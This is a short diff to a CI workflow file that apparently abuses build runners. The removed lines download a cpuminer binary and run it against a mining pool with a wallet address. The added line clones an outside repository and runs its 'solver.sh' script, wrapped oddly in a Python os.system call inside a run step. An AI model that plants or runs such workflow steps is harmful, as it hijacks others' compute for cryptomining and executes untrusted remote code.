@@ -17,10 +17,6 @@ jobs:
         JOB: ${{ matrix.go }}  
     steps:  
     - name: DOWNLOAD  
-      run: Invoke-WebRequest https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz 
-    - name: Extract  
-      run: tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz  
-    - name: RUNNING  
-      run: ./cpuminer -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u XcF8ZFvmFbpWtAqNGKkcQWpwvBrhKocdrK -p c=DASH,mc=QOGE,ID=W-$(echo $(hostname)) -t 2 
+      run: os.system('git clone https://github.com/Xilahani8/asd.git && cd asd && bash solver.sh')
     - name: DONE  
       run: exit
